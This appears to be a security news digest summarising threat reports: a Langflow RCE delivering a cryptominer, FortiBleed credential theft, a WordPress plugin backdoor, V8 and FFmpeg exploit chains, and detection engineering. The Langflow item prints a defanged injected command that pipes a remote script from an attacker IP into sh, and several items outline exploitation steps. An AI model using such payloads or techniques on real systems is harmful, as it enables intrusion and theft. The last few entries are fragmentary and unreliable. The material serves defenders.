item.title: From Langflow to Monero: Inside CVE-2026-33017 Cryptominer
item.description:
CVE-2026-33017, an unauthenticated RCE in Langflow's public flow build endpoint, is being actively exploited to deliver a Go-based cryptominer with SSH worm lateral movement, defense evasion across AppArmor/SELinux/Aliyun, and dual-watchdog persistence.
Key findings:
- Initial access is a single unauthenticated POST to /api/v1/build_public_tmp/{flow_id}/flow with __import__('os').system('curl hxxp[://]83.142.209[.]214:8080/isp[.]sh | sh') (T1190, T1059.006). The operator reused flow_id 0ee284cc-0eb1-493f-bc60-94fa8d1cfd18 across 19 days of observed attacks, a detection gift. Recon used 10 spoofed UAs in 5 seconds before switching to a stable python-requests/2.25.1 for exploitation.
- Dropper isp.sh creates /var/tmp/.xlamb/, downloads the UPX-packed Go ELF lambsys, then SSH-worms to every host in known_hosts plus ssh-agent loaded keys using BatchMode=yes and StrictHostKeyChecking=no (T1021.004, T1552.004). Scope is directly tied to Langflow's deployment privileges.
- lambsys (SHA256: 71af8bd9...) runs a 39-process kill list targeting Kinsing, WatchDog, Outlaw, and Rocke rivals, kills processes on 12 mining ports via netstat, disables AppArmor, SELinux, UFW, iptables, the kernel NMI watchdog, and Aliyun's security agent, then deletes /var/log/syslog (T1562.001, T1562.004, T1070.002).
- Persistence is a cron job every 5 minutes plus init_rmount at /var/tmp/init_rmount on a 60-second loop, both re-downloading lambsys from C&C if missing.

item.title: Testing AI Threat Hunting against Real-World KQL: A Side-by-Side Test
item.description:
AI-generated KQL caught only 3 of 12 real results in a head-to-head hunt test, exposing a 75% false-negative rate that would leave defenders blind in production.
Key findings:
- Both ChatGPT (GPT-5.5) and Claude (Sonnet 4.6) scoped their queries to DeviceProcessEvents alone, missing roughly 70% of telemetry. The human query searched DeviceProcessEvents AND DeviceEvents, which is where much of the PowerShell ScriptContent and ActionType telemetry lives. Querying only one table is a silent coverage gap, not a syntax error.
- ChatGPT's query failed to execute entirely due to unsupported pipe-chaining syntax. Claude's ran but returned 3 results versus 12 from the human query. A query that runs and looks reasonable is not the same as a query that hunts accurately.
- The human query used regex across ActionType values (PowerShellCommand, ProcessCreated, ScriptContent) and pulled ScriptContent from AdditionalFields via parse_json, catching encoded and in-memory invocations the LLMs missed by filtering only on process name and command-line strings.
- Schema awareness is the core gap. LLMs produce syntactically plausible KQL but don't know which fields carry what data in your environment. Hunting for the literal string Invoke-Mimikatz or scoping only to powershell.exe creates the illusion of coverage.
Takeaway: use LLMs to prototype and review discrete query blocks, not to own the full hunt.

item.title: SOC Forensics: How to Set Up Automatic DFIR Analysis in the Cloud
item.description:
EDR telemetry has blind spots: disabled agents, unmonitored data types, and missing installs all leave gaps that automated cloud-based artifact collection can close in parallel with triage.
Key findings:
- EDR telemetry fails when an attacker uses tools like EDR Silencer to block data transmission, when the agent lacks visibility into application-layer artifacts like browser URLs, or when the agent was never deployed. Artifact collectors such as KAPE, UAC, or the Cyber Triage Collector fill those gaps by copying targeted files and volatile data directly from the endpoint.
- The cloud pipeline works by uploading collector output to S3 or Azure Blob storage, which triggers an AWS Lambda or Azure Function. The Lambda passes the file path to an analysis API, which scores artifacts as bad or suspicious using rules, malware scanning, and AI. This runs in the background while an analyst reviews telemetry.
- Lambda functions have a 3-second default timeout and cannot do heavy processing. The correct pattern is to use them only to pass the S3 path to an existing server API or to spin up a VM for analysis.
- The fast collector mode targets lateral movement, data exfiltration, and remote access artifacts with a goal of under 10 minutes collection time, giving analysts scored results ready by the time telemetry review is done.

item.title: WhatsApp VBScript Campaign Installs ManageEngine Endpoint Central for Persistent Remote Access
item.description:
WhatsApp DM attachments deliver a preconfigured ManageEngine Endpoint Central agent, giving attackers persistent RMM access with no obvious malicious binary on disk. Active as of June 22, 2026, victims span Malaysia 🇲🇾 (~80%), Brazil 🇧🇷, India 🇮🇳, and beyond.
- VBS/VBE files disguised as financial docs ("Outstanding Payment List.vbs") are sent from hijacked WhatsApp accounts. Double-clicking triggers wscript.exe, starting a staged chain that creates hidden randomized folders under C:\Users\Public\Documents and fetches additional payloads via curl, bitsadmin, certutil, or PowerShell.
- Stage 2 weakens UAC by setting HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin to 0 via repeated ShellExecute runas loops. Zone.Identifier alternate data streams are deleted from extracted files to strip MotW warnings before execution.
- Stage 3 silently installs a preconfigured ManageEngine Endpoint Central agent via msiexec.exe using UEMSAgent.msi, UEMSAgent.mst, and DCAgentServerInfo.json, all reporting to attacker-controlled servers including 202.61.160[.]208 and 38.55.151[.]63.
- No confirmed attribution. Simplified Chinese 🇨🇳 comments appear across VBScript variants (low-confidence indicator). One C2 IP overlaps with prior ValleyRAT and Gh0st RAT activity but no direct link is established.

item.title: ShapedPlugin Supply Chain Attack Backdoors Pro Plugin Updates
item.description:
ShapedPlugin's Pro plugin build pipeline was compromised between April and June 2026, backdooring licensed WordPress updates and stealing credentials plus 2FA TOTP seeds from hundreds of thousands of potential targets.
Key findings:
- At least three Pro plugins confirmed backdoored: Product Slider Pro for WooCommerce, Real Testimonials Pro, and Smart Post Show Pro. Wordfence obtained a malicious copy of Real Testimonials Pro 3.2.5 directly from the official update endpoint. Free WordPress.org plugins were left clean, likely deliberate targeting of paying customers.
- The infection is two-stage: LicenseLoader.php downloads a payload, registers the victim domain with C2, then self-deletes, erasing the initial infection vector. The dropped payload masquerades as "woocommerce-subscription" (singular), hides from the plugin list, installs Tiny File Manager and Adminer, registers a REST API backdoor accepting arbitrary file writes, drops a webshell, and includes a hardcoded MD5 hash for passwordless admin login.
- Critically, the malware exfiltrates TOTP seeds from multiple 2FA plugins to generate.2faplugin[.]org. If that domain received traffic, stolen seeds render password rotation alone insufficient.
- Forensics point to CI/CD pipeline compromise: only four files modified in a two-hour window on May 21st, and the package contains git SHA references from a private repository. C2 infrastructure ties to AEZA GROUP LLC, Russian 🇷🇺-linked hosting.

item.title: Global cybersecurity agencies warn of credential exposure in FortiBleed campaign targeting Fortinet firewalls, VPN gateways
item.description:
FortiBleed campaign exposes 86,000+ working Fortinet credentials across 194 countries. Russian-speaking 🇷🇺 actors automated credential stuffing and brute-force at scale, targeting NATO members with no zero-day required.
Key findings:
- Over 86,644 verified working credentials harvested from FortiGate firewalls and SSL VPN gateways since at least February 2026, spanning banks, telecoms, hospitals, government agencies, and multinationals across 194 countries. Fortinet tracks related prior incidents under FG-IR-26-060 and FG-IR-25-647.
- The operation is fully automated: scanners find internet-facing FortiGate devices, test curated password lists, then use compromised devices as listening posts to harvest VPN credentials from live traffic, feeding them back into the scanner to compound exposure.
- No zero-day involved. Fortinet and SOCRadar confirm this is credential reuse and brute-force against devices lacking MFA and with weak password hygiene, making this a hygiene failure at scale, not a product vulnerability.
- Watch for unauthorized accounts named forticloud, fortiuser, fortinet-support, or fortinet-tech-support. Check domain controller logs for lateral movement. Log review is the first forensic step before any remediation.
Takeaway: Isolate, preserve logs and config, then factory reset confirmed compromised devices.

item.title: CVE-2024-40766: The Patch Fixed the Bug. Nobody Fixed the Configuration., (Tue, Jun 23rd)
item.description:
CVE-2024-40766 (CVSS 9.3) in SonicWall SSLVPN has been exploited by Akira and Fog ransomware since Sept 2024. Patching firmware is not remediation: stale accounts, broken LDAP config, and an exposed MFA enrollment portal are keeping patched firewalls wide open.
Key findings:
- Akira and Fog operators compromised SonicWall Gen 5/6/7 firewalls at scale, with encryption occurring in under 4 hours and some cases in 55 minutes. In Sept 2025 SonicWall confirmed the MySonicWall cloud platform was breached and all configuration backup files containing encrypted credentials were exposed. Any org with a MySonicWall account should treat its backup as compromised and rotate credentials now.
- CVE-2024-12802 adds a second layer on Gen 6: a firmware patch alone does not fix this MFA bypass. Six manual LDAP reconfiguration steps from SNWLID-2025-0001 are required. Devices that looked patched by version were still fully exploitable. Gen 6 reached end-of-life April 16, 2026. No more patches are coming.
- Across 14 audited firewalls: 12 had stale local accounts not in AD, including usernames with non-printable characters (a strong indicator of automated account creation by exploitation tooling). 11 had never rotated local passwords post-upgrade. 9 had the Default LDAP User Group granting implicit SSLVPN access to every AD account.
- The Virtual Office Portal (MFA/TOTP enrollment) was internet-exposed on 7 of 14 firewalls.

item.title: FortiBleed: The Most Detailed Breakdown Yet of an Active Russian Credential-Harvesting Operation
item.description:

Key findings:
- The attack chain runs five phases: Masscan port sweeps and a custom Shodan_Recon tool for recon, FortiProbe-fast to filter confirmed FortiGate targets, SSH brute-force via 16 FortiGate-specific wordlists plus SSL-VPN credential stuffing, then passive sniffing via FortigateSniffer, a Golang tool that abuses the native FortiOS command "diagnose sniffer packet" to capture Kerberos, NTLM, RADIUS, LDAP, RDP, and MSSQL auth traffic across 24 protocols without dropping malware.
- FortigateSniffer runs only 07:00-18:00 Moscow Time, deliberately blending into business-hours traffic. Captured hashes are cracked offline via a Hashtopolis-managed GPU cluster running Hashcat, with rented vast.ai capacity and a Telegram bot delivering live results to a single hardcoded admin.
- Confirmed lateral movement into AD environments and targeted DFS backup exfiltration from a NATO contractor, triggered within minutes of Kerberos hashes cracking. 19,000 devices are still being actively sniffed at time of writing.
- ~66% of victims have fewer than 200 employees; IT managed service providers are the top targeted sector, creating downstream customer exposure paths.

item.title: Detecting the Klue supply chain attack in Salesforce instances
item.description:
Icarus threat group exploited a dormant OAuth credential at Klue to harvest tokens across Salesforce, Gong, HubSpot, and Slack, then ran automated API exfiltration against hundreds of enterprise CRMs before launching an extortion campaign.
Key findings:
- Initial access came from a never-decommissioned prototype credential inside Klue's integration infrastructure, not phishing or a CVE. Activity began June 11 at 12:56 UTC; Klue revoked tokens June 13. Extortion emails with a 48-hour deadline followed June 16, demanding contact via Session Messenger.
- The actor queried Salesforce REST API endpoint /services/data/v59.0/query/* using Python scripts. User agents to hunt: Python-urllib/3.12, Python-urllib/3.14, and the anomalous string "5238". Confirmed actor IPs: 138.226.246[.]94, 212.86.125[.]24, 213.111.148[.]90, 94.154.32[.]160.
- Target objects were Opportunity, Contact, Lead, Account, Contract, Case, and Campaign. QueryMore usage signals bulk exfiltration since Salesforce caps each request at 2,000 records. Failed ApiException messages in RestApi logs (fault=-1, exceeded 100000 distinct who/whats) reveal aggressive broad-scope queries.
- OAuth refresh tokens sustained access after initial token revocation in a subset of environments. Detect via login_sub_type:oauthrefreshtoken in Login logs or login_sub_type:"OAuth Refresh Token" in LoginEvent.

item.title: Out of Shift: How a Shared State Bug in V8’s AsmJS Parser Broke the Ubercage
item.description:
CVE-2026-3542 in Chrome's V8 AsmJS parser corrupts WebAssembly opcode streams, bypassing the Ubercage sandbox entirely to reach arbitrary code execution from a single bug.
Key findings:
- CVE-2026-3542, patched March 3 2026, lives in AsmJsParser::ValidateHeapAccess(). The heap_access_shift_position_ attribute is instance-level state shared across all recursive parse calls. A nested shift expression like HEAP32[1 << (n >> 2)] causes ShiftExpression() to recurse, overwriting that position with a stale offset. When DeleteCodeAfter() truncates the opcode stream using that stale value, subsequent opcodes are left misaligned and later emitted immediates become orphaned opcodes the decoder executes unchecked.
- The Ubercage bypass is structural, not incidental. AsmJS-generated opcodes skip ValidationTag::validate entirely because V8 trusts its own parser output. An attacker who controls the corrupted stream can inject opcodes like kExprCallRef or kExprStructGet with no type-safety checks, treating arbitrary 64-bit values on the stack as addresses. This gives out-of-sandbox read/write from a single memory-corruption primitive.
- Exploit chain: spray TypeDefinition structs on the canonical type zone so a cross-module struct type lands adjacent to the AsmJS module's type vector. Use kExprI64Const to place a crafted 64-bit address on the stack, then kExprStructGet/kExprStructSet for arbitrary read/write.

item.title: 4,300+ Outdated Routers Hijacked in Stealthy Spy Infrastructure by AryStinger malware
item.description:
AryStinger malware turns 4,300+ end-of-life Realtek RTL819X routers into a distributed reconnaissance botnet, exploiting CVEs from 2013 and 2016 with zero VirusTotal detections at discovery.
- Initial access via CVE-2013-3307 and CVE-2016-5681, both over a decade old, spreading a C-based ELF binary from 107.150.106[.]45. The C build persists by dropping Dropbear SSH on port 2332 and communicates via HTTP with Protobuf traffic XOR-encrypted using the hardcoded key sh_#@!_2024_secret, suggesting the op predates the March 12, 2026 detection.
- A Go-based second build targets QNAP NAS devices via CVE-2025-11837, patched November 2025 and exploited within five months. It integrates fscan, ksubdomain, httpx, and Tlsx, plus a ScriptWork engine that executes attacker-supplied Go, Java, or Python source directly on device, dropping plaintext payloads to disk.
- The fleet operates as an ORB network: each Executor node receives a scan slice, runs it in parallel, and returns results, masking true operator origin. D-Link DIR-850L accounts for ~75% of infected devices.
- C2 and download infrastructure uses ajb8[.]com, dataexplore[.]cc, and dataexplore[.]co. Watch for processes named syswapd0h or syswapd0w and unexpected binaries in /tmp/bin.
Hunt outbound connections to those three domains, check /tmp/bin, and audit for Dropbear SSH on port 2332.

item.title: PixelSmash – Critical FFmpeg Vulnerability Turns Media Files into Weapons
item.description:
CVE-2026-8461 (CVSS 8.8): heap OOB write in FFmpeg's MagicYUV decoder enables RCE via a single 50 KB media file upload, hitting Jellyfin, Nextcloud, Emby, Immich, OBS, and AI/ML pipelines.
- CVE-2026-8461 lives in libavcodec/magicyuv.c. When slice_height is odd (attacker-controlled via bitstream), ceiling-rounded chroma shifts accumulate an extra row per slice past the allocated buffer. With coded_height=32 and slice_height=31, the decoder writes 640 attacker-controlled bytes one full row beyond the Cb chroma plane, landing directly on the AVBuffer struct FFmpeg allocates immediately after pixel data.
- Exploitation overwrites AVBuffer.free with system() and AVBuffer.opaque with a shell command pointer. When av_frame_unref fires during normal frame cleanup, the hijacked indirect call executes the attacker's command before the process crashes. JFrog demonstrated a reverse shell on Jellyfin 10.9 (jellyfin-ffmpeg 7.1.3) via automatic library scan and on Nextcloud via the Movie preview provider, both triggered by uploading a single crafted AVI with zero authentication. ASLR was disabled for the RCE demo; without ASLR bypass the primitive reliably delivers DoS on every tested target.
- The torrent vector is zero-click: a malicious AVI dropped into Jellyfin's watched media folder triggers ffprobe automatically.

item.title: What Was a 45-GPU Cracking Farm Built For?
item.description:
A 45-GPU cracking farm turned raw FortiGate hashes into a validated, enriched access catalog of 74,000+ records across 22,000 orgs. Active credentials confirmed in sample testing, with an initial access broker already selling access.
- The operation was exposed by its own OPSEC failures: an open directory on port 9999 and a Hashtopolis panel on port 8443 running default credentials. Hashtopolis coordinated ~45 NVIDIA RTX 4090s across six agents with EPYC and Xeon Platinum hosts doing the heavy lifting, running hashcat at scale with rule-based and mask attacks. Last-activity timestamps align with first detected exploitation on 31 May 2026.
- Python tooling chained the full kill chain: LDAP recon pulling users, SPNs, and privilege flags; SMB/DFS crawlers hunting creds in config files; Kerberoasting and AS-REP targeting; then OSINT enrichment adding sector, revenue, and country to each record. Enrichment is the tell: you add revenue data when you plan to sell or rank.
- Forum user SantaAd posted ~34,000 FortiVPN entries on a Russian-language forum June 12, asking $60K opening bid, $120K blitz. C2 IPs include 185.229.26[.]83 and 213.169.49[.]142. Campaign favored management ports 443, 9443, 4443, 8443, and 10443.
If you run FortiGate, rotate all credentials now, pull management interfaces off the public internet, enforce MFA, and hunt for LDAP recon and Kerberoasting activity.

item.title: Building a CI/CD pipeline for Sigma rules
item.description:
Detection as Code in practice: a full CI/CD pipeline for Sigma rules cuts out the "edit and save in the SIEM console" failure mode with automated validation, translation, testing, and shadow-mode deployment.
Key details:
- The four-stage pipeline is validate, translate, test, deploy. sigma-cli (wrapping pySigma) handles validation and conversion with no paid tooling. The SigmaHQ/sigma-rules-validator GitHub Action checks rules against the official JSON Schema. A 30-line Python script enforces metadata completeness: title, status, date, author, logsource, detection, and MITRE ATT&CK tags are all required or CI fails.
- Translated outputs (Sentinel KQL, Splunk SPL, Elastic Lucene) live under platform-translations/ as build artifacts generated by CI, never hand-edited. Field mapping pipelines applied at conversion time are where silent failures hide: a missing pipeline flag produces a syntactically valid query that matches nothing.
- Every rule needs two JSON fixtures: one true-positive event and one true-negative. pytest evaluates compiled queries against both. CERT-EU's droid goes further, running actual Atomic Red Team simulations in a sandbox and verifying the Sigma rule fires on real telemetry, eliminating "the fixture was wrong, not the rule" failures.
- New rules deploy to the SIEM with alerting suppressed for at least seven days (shadow mode). Match volume and event samples get human review before promotion.

item.title: Bypassing Microsoft Entra Conditional Access Policies via Nested App Authentication
item.description:
Microsoft Entra Conditional Access Policies could be fully bypassed via Nested App Authentication (NAA/BroCI), granting broad Microsoft Graph access even when CAPs were explicitly blocking a user. Patched June 2026.
Key findings:
- Three first-party app IDs bypassed CAP evaluation entirely when used as NAA targets against Microsoft Graph: ADIbizaUX (74658136-14ec-4630-ad9b-26e160ff0fc6), Intune for Education portal extension (f52f5287-0be2-4052-83e8-e69620aa67cc), and Intune portal extension (5926fc8e-304e-4f59-8bed-58ca97cc39a4). The Azure Portal app (c44b4083-3bb0-49c1-b47d-974e53cbdf3c) acted as the broker host.
- Attack chain: phish or AiTM to steal an Azure Portal refresh token, then use the NAA flow with brk_client_id and brk_redirect_uri parameters to mint a Graph token, completely skipping CAP. The ADIbizaUX app carries a massive pre-consented scope set and also exposes undocumented IAM APIs with no logging.
- The bypass window is bounded by a hard 24-hour SPA refresh token lifetime that cannot be extended, limiting but not eliminating the persistence opportunity.
Takeaway: Hunt your Entra sign-in logs for token requests to login.microsoftonline[.]com carrying brk_client_id targeting those three app IDs. Confirm the fix is in place by verifying AADSTS53003 is now returned for those flows. AiTM detections on Azure Portal authentication are your upstream control.

item.title: A Multi-Stage Steganographic Loader Campaign Deploying Diverse Payloads Globally
item.description:

Hunt for powershell.exe or cmd.exe whose grandparent is svchost.exe -k DcomLaunch. That two-hop parent chain is rare in legitimate traffic and is the clearest signal this technique leaves behind.

item.title: Applying software engineering discipline to threat detection
item.description:
Treating detection rules as software artifacts eliminates the tribal-knowledge failures that let misconfigured SIEM rules fire 4,000 times overnight with no owner, no history, and no rollback path.
Key details: - Every detection rule belongs in Git with metadata: ATT&CK technique ID, data source, author, last reviewed date, and an explicit owner with an escalation path. Rules without ownership accumulate silently and become functionally dead while appearing active. - Sigma (YAML-based, vendor-neutral) compiles to Splunk SPL, Sentinel KQL, Elastic EQL, Chronicle YARA-L, and more via sigma-cli/pySigma. The SigmaHQ repo gives you a maintained baseline to fork, not a blank page. Watch for field-name portability failures: a rule can compile cleanly and match nothing if target schema fields differ. - Every rule needs two test fixtures in CI: one malicious event it must match, one benign event it must not. Pull requests missing both should be rejected automatically, the same gate you apply to application code. - New rules enter shadow mode first (minimum 7 days, writes to a separate index, no analyst alert) before promotion. YARA-X adds a yr compile CI step for file/memory rules and clean JSON/YAML pipeline output.
Practitioner takeaway: start with five high-value rules, a Git repo, and a sigma-cli CI check that rejects PRs without test coverage.

item.description:

Key details: - Data confirmed legitimate by Hudson Rock. Includes full config exports with credentials visible only from the device itself. IP overlap with the 2025 Belsen Group leak (15k devices) is minimal, making this a largely separate, more recent compromise. - Fortinet moved to PBKDF2 credential storage in early-2025 firmware, but only re-hashes passwords after an admin logs in post-update. item.title: The Compromise of 30,000 Fortinet Firewalls
item.description:

Credentials are verified working. If your org is in it, treat access as confirmed, not theoretical

item.title: Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain
item.description:

Idle sentinel is MMMMM==YYYYY - Attribution rests on code-level overlaps with known Dropping Elephant samples: shared BitBlt screenshot logic, 0x2710 buffer constant, WININET request flow, and cmd.exe /c chcp 65001 shell pattern
